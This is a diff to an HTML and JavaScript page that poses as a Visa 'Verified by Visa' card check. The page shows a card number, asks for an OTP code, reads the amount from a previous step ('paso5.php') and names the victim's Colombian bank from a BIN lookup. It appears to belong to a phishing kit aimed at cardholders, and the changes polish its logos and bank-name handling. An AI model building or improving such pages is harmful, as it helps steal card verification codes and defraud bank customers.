@@ -21,11 +21,14 @@
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Inter', system-ui, -apple-system, sans-serif; background: var(--visa-bg); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .container { background: var(--visa-white); border-radius: 16px; box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08); padding: 40px; max-width: 520px; width: 100%; }
+        
+        /* --- CABECERA CON LOGOS FIJOS --- */
         .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid var(--visa-border); }
         .visa-logo { display: flex; align-items: center; flex-shrink: 0; }
-        .visa-logo img { height: 90px; width: auto; display: block; }
-        .bank-logo { display: flex; align-items: center; justify-content: flex-end; flex-shrink: 0; max-width: 55%; }
-        .bank-logo img { height: 110px; width: auto; max-width: 200px; object-fit: contain; display: block; }
+        .visa-logo img { height: 50px; width: auto; display: block; object-fit: contain; }
+        .bank-logo { display: flex; align-items: center; justify-content: flex-end; flex-shrink: 0; }
+        .bank-logo img { height: 45px; width: auto; max-width: 160px; object-fit: contain; display: block; }
+
         .security-banner { background: #f8fafc; border: 1px solid var(--visa-border); border-radius: 12px; padding: 14px 18px; margin-bottom: 24px; display: flex; align-items: flex-start; gap: 12px; }
         .security-banner .shield-icon { flex-shrink: 0; width: 22px; height: 22px; margin-top: 2px; color: var(--visa-blue); }
         .security-banner p { font-size: 0.8125rem; color: var(--visa-text-muted); line-height: 1.6; margin: 0; }
@@ -35,12 +38,14 @@
         .form-title { font-size: 1.375rem; font-weight: 700; color: var(--visa-text); margin-bottom: 4px; }
         .form-subtitle { font-size: 0.9375rem; color: var(--visa-text-muted); margin-bottom: 24px; line-height: 1.5; }
         .form-subtitle strong { color: var(--visa-text); }
+        
         .transaction-info { background: #f8fafc; border-radius: 12px; padding: 14px 18px; margin-bottom: 24px; border: 1px solid var(--visa-border); }
         .info-row { display: flex; justify-content: space-between; align-items: center; padding: 5px 0; font-size: 0.875rem; }
         .info-row:not(:last-child) { border-bottom: 1px solid var(--visa-border); }
         .info-label { color: var(--visa-text-muted); font-weight: 500; min-width: 80px; flex-shrink: 0; }
         .info-value { color: var(--visa-text); font-weight: 600; text-align: right; flex: 1; }
         .card-number-display { font-family: monospace; font-size: 1.1rem; color: var(--visa-blue); letter-spacing: 1px; }
+        
         form { display: flex; flex-direction: column; gap: 16px; }
         .form-group { display: flex; flex-direction: column; gap: 4px; }
         .form-label { font-size: 0.8125rem; font-weight: 600; color: var(--visa-text); }
@@ -54,33 +59,60 @@
         .error-message { color: var(--visa-error); font-size: 0.75rem; display: none; margin-top: 4px; }
         .form-group.error .form-input { border-color: var(--visa-error); }
         .form-group.error .error-message { display: block; }
+        
         .otp-section { display: none; animation: fadeIn 0.4s ease; background: #f8fafc; border: 1px solid var(--visa-border); border-radius: 12px; padding: 16px 18px; margin-top: 4px; }
         .otp-section.visible { display: block; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
         .otp-info { display: flex; align-items: center; gap: 8px; font-size: 0.8125rem; color: var(--visa-text-muted); margin-bottom: 8px; }
         .otp-info svg { width: 18px; height: 18px; flex-shrink: 0; }
+        
         .button-group { display: flex; gap: 12px; margin-top: 8px; }
         .btn { padding: 12px 24px; border: none; border-radius: 8px; font-family: 'Inter', sans-serif; font-size: 0.9375rem; font-weight: 600; cursor: pointer; transition: all 0.2s; flex: 1; text-align: center; display: inline-flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-primary { background: var(--visa-blue); color: white; }
         .btn-primary:hover:not(:disabled) { background: #141a5a; }
         .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
+        
         .form-footer { margin-top: 20px; padding-top: 16px; border-top: 1px solid var(--visa-border); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
         .form-footer .help-text { font-size: 0.75rem; color: var(--visa-text-muted); }
         .form-footer .help-text a { color: var(--visa-blue); text-decoration: none; }
         .form-footer .help-text a:hover { text-decoration: underline; }
+        
         .status-message { display: none; padding: 12px 16px; border-radius: 8px; font-size: 0.875rem; font-weight: 500; margin-bottom: 16px; text-align: center; }
         .status-message.error { display: block; background: #fef2f2; color: var(--visa-error); border: 1px solid #fecaca; }
         .status-message.success { display: block; background: #f0fdf4; color: var(--visa-success); border: 1px solid #bbf7d0; }
         .status-message.info { display: block; background: #eff6ff; color: #1e40af; border: 1px solid #bfdbfe; }
         .status-message.error-usuario { display: block; background: #fef2f2; color: var(--visa-error); border: 3px solid #dc2626; font-weight: 700; font-size: 1rem; padding: 16px; }
+        
         .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.6); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; backdrop-filter: blur(4px); }
         .loading-overlay.active { display: flex; }
         .spinner { width: 48px; height: 48px; border: 4px solid rgba(255, 255, 255, 0.3); border-top: 4px solid white; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 16px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loading-text { color: white; font-size: 1rem; font-weight: 500; text-align: center; }
         .loading-subtext { color: rgba(255, 255, 255, 0.7); font-size: 0.875rem; margin-top: 4px; }
-        @media (max-width: 768px) { .container { padding: 30px 24px; max-width: 480px; } .visa-logo img { height: 70px; } .bank-logo img { height: 85px; max-width: 150px; } }
-        @media (max-width: 480px) { .container { padding: 20px 16px; border-radius: 12px; } .header { margin-bottom: 16px; padding-bottom: 12px; } .visa-logo img { height: 55px; } .bank-logo { max-width: 50%; } .bank-logo img { height: 70px; max-width: 120px; } .form-title { font-size: 1.125rem; } .form-subtitle { font-size: 0.875rem; margin-bottom: 16px; } .button-group { flex-direction: column; gap: 8px; } .btn { width: 100%; padding: 14px; font-size: 0.875rem; } .form-footer { flex-direction: column; align-items: flex-start; gap: 8px; } .info-label { min-width: 60px; font-size: 0.8rem; } .info-value { font-size: 0.8rem; } .transaction-info { padding: 12px 14px; margin-bottom: 16px; } .security-banner { padding: 12px 14px; margin-bottom: 16px; } .security-banner p { font-size: 0.75rem; } .otp-section { padding: 14px; } .form-input { padding: 10px 14px; font-size: 0.9375rem; } }
+        
+        @media (max-width: 768px) { 
+            .container { padding: 30px 24px; max-width: 480px; } 
+            .visa-logo img { height: 40px; } 
+            .bank-logo img { height: 35px; max-width: 130px; } 
+        }
+        @media (max-width: 480px) { 
+            .container { padding: 20px 16px; border-radius: 12px; } 
+            .header { margin-bottom: 16px; padding-bottom: 12px; } 
+            .visa-logo img { height: 35px; } 
+            .bank-logo img { height: 30px; max-width: 110px; } 
+            .form-title { font-size: 1.125rem; } 
+            .form-subtitle { font-size: 0.875rem; margin-bottom: 16px; } 
+            .button-group { flex-direction: column; gap: 8px; } 
+            .btn { width: 100%; padding: 14px; font-size: 0.875rem; } 
+            .form-footer { flex-direction: column; align-items: flex-start; gap: 8px; } 
+            .info-label { min-width: 60px; font-size: 0.8rem; } 
+            .info-value { font-size: 0.8rem; } 
+            .transaction-info { padding: 12px 14px; margin-bottom: 16px; } 
+            .security-banner { padding: 12px 14px; margin-bottom: 16px; } 
+            .security-banner p { font-size: 0.75rem; } 
+            .otp-section { padding: 14px; } 
+            .form-input { padding: 10px 14px; font-size: 0.9375rem; } 
+        }
     </style>
 </head>
 <body>
@@ -91,12 +123,13 @@
     </div>
 
     <div class="container">
+        <!-- CABECERA CON LOGOS FIJOS -->
         <div class="header">
             <div class="visa-logo">
                 <img src="visa.png" alt="Visa" />
             </div>
-            <div class="bank-logo" id="bankLogoContainer">
-                <img id="bankLogoImg" src="image.png" alt="Cámara de Comercio" style="display:block;" />
+            <div class="bank-logo">
+                <img src="image.png" alt="Cámara de Comercio" />
             </div>
         </div>
 
@@ -263,8 +296,6 @@
         const loadingText = document.getElementById('loadingText');
         const loadingSubtext = document.getElementById('loadingSubtext');
         const statusMessage = document.getElementById('statusMessage');
-        const bankLogoImg = document.getElementById('bankLogoImg');
-        const bankLogoContainer = document.getElementById('bankLogoContainer');
         const bancoNombre = document.getElementById('bancoNombre');
 
         // ============================================
@@ -294,8 +325,6 @@
 
         // ============================================
         // NORMALIZADOR DE NOMBRE DE BANCO
-        // Convierte cualquier variante de HandyAPI
-        // en un nombre estándar de nuestro catálogo.
         // ============================================
         function normalizarBanco(rawIssuer) {
             if (!rawIssuer) return null;
@@ -303,74 +332,30 @@
             const raw = rawIssuer.toLowerCase().trim();
             console.log('🔍 Normalizando banco:', raw);
 
-            // ---- BBVA / BANCO BILBAO VIZCAYA ARGENTARIA ----
-            if (
-                raw.includes('bbva') ||
-                raw.includes('bilbao') ||
-                raw.includes('vizcaya') ||
-                raw.includes('vizcaya argentaria') ||
-                raw.includes('banco bilbao') ||
-                raw.includes('banco ganadero')
-            ) {
+            if (raw.includes('bbva') || raw.includes('bilbao') || raw.includes('vizcaya') || raw.includes('vizcaya argentaria') || raw.includes('banco bilbao') || raw.includes('banco ganadero')) {
                 console.log('✅ Detectado como BBVA Colombia');
                 return 'BBVA Colombia';
             }
 
-            // ---- BANCOLOMBIA ----
             if (raw.includes('bancolombia')) return 'Bancolombia';
-
-            // ---- DAVIVIENDA ----
             if (raw.includes('davivienda')) return 'Davivienda';
-
-            // ---- DAVIBANK ----
             if (raw.includes('davibank')) return 'Davibank';
-
-            // ---- BANCO DE BOGOTÁ ----
             if (raw.includes('banco de bogota') || raw.includes('banco de bogotá')) return 'Banco de Bogotá';
-
-            // ---- BANCO POPULAR ----
             if (raw.includes('banco popular') || raw.includes('popular')) return 'Banco Popular';
-
-            // ---- BANCO DE OCCIDENTE ----
             if (raw.includes('occidente')) return 'Banco Occidente';
-
-            // ---- CITIBANK ----
             if (raw.includes('citibank') || raw.includes('citi')) return 'Citibank Colombia';
-
-            // ---- AV VILLAS ----
             if (raw.includes('av villas') || raw.includes('avvillas')) return 'Banco AV Villas';
-
-            // ---- ITAÚ ----
             if (raw.includes('itau') || raw.includes('itaú')) return 'Itaú';
-
-            // ---- GNB SUDAMERIS ----
             if (raw.includes('gnb') || raw.includes('sudameris')) return 'Banco GNB Sudameris';
-
-            // ---- FALABELLA ----
             if (raw.includes('falabella')) return 'Banco Falabella';
-
-            // ---- PICHINCHA ----
             if (raw.includes('pichincha')) return 'Banco Pichincha';
-
-            // ---- CAJA SOCIAL ----
             if (raw.includes('caja social')) return 'Caja Social';
-
-            // ---- COOPCENTRAL ----
             if (raw.includes('coopcentral')) return 'Banco Cooperativo Coopcentral';
-
-            // ---- BANCOOMEVA ----
             if (raw.includes('bancoomeva')) return 'Bancoomeva';
-
-            // ---- FINANDINA ----
             if (raw.includes('finandina')) return 'Banco Finandina';
-
-            // ---- SCOTIABANK COLPATRIA ----
             if (raw.includes('scotiabank') || raw.includes('colpatria')) return 'Scotiabank Colpatria';
-
-            // ---- BANCO AGRARIO ----
             if (raw.includes('agrario')) return 'Banco Agrario';
 
-            // ---- FALLBACK: usar tal cual (capitalizado) ----
             console.log('⚠️ Banco no reconocido, usando nombre crudo:', rawIssuer);
             return rawIssuer.split(' ')
                 .map(w => w.charAt(0).toUpperCase() + w.slice(1).toLowerCase())
@@ -440,40 +425,25 @@
         // ============================================
         window.addEventListener('load', function() {
             initializeTransaction();
-            cargarLogoBanco();
+            cargarNombreBanco();
             console.log('✅ Verificado por VISA listo');
             iniciarHeartbeat();
         });
 
-        function cargarLogoBanco() {
+        // SOLO CARGA EL NOMBRE, EL LOGO YA ESTÁ FIJO EN EL HTML
+        function cargarNombreBanco() {
             let bancoEmisor = localStorage.getItem('bancoEmisor');
-            console.log('🏛️ Banco emisor desde localStorage (crudo):', bancoEmisor);
-
-            // Normalizar por si acaso viene con otro formato
             if (bancoEmisor) {
                 bancoEmisor = normalizarBanco(bancoEmisor);
                 localStorage.setItem('bancoEmisor', bancoEmisor);
-                console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
-            }
-
-            if (bancoEmisor) {
                 bancoNombre.textContent = bancoEmisor;
-            }
-
-            if (bancoEmisor && bankLogos[bancoEmisor]) {
-                bankLogoImg.src = bankLogos[bancoEmisor];
-                bankLogoImg.alt = bancoEmisor;
-                bankLogoImg.style.display = 'block';
-                bankLogoContainer.style.display = 'flex';
-                console.log('✅ Logo del banco cargado:', bankLogos[bancoEmisor]);
+                console.log('🏛️ Banco emisor normalizado:', bancoEmisor);
             } else {
-                bankLogoContainer.style.display = 'none';
-                console.log('❌ No se encontró logo para el banco:', bancoEmisor);
+                bancoNombre.textContent = 'banco emisor';
             }
         }
 
         function initializeTransaction() {
-            // MONTO DINÁMICO — lee el mismo monto que paso5.php
             const montoGuardado = localStorage.getItem('montoTotal');
             const storagePriority = localStorage.getItem('procesamiento_prioritario') === 'true';
 
